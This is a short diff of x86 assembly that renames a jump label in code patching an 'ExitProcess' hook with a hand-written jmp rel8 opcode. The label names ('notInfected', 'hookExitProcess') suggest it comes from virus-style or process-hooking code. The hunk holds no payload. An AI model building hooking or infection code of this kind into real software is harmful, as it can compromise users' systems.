@@ -75,7 +75,7 @@ jmp	endPatchHook
 patchNotHook:
 mov	eax, 0EBh ; Jmp rel8
 stosb
-mov	eax, notInfected - hookExitProcess - 2
+mov	eax, notHooked - hookExitProcess - 2
 stosb
 endPatchHook:
 
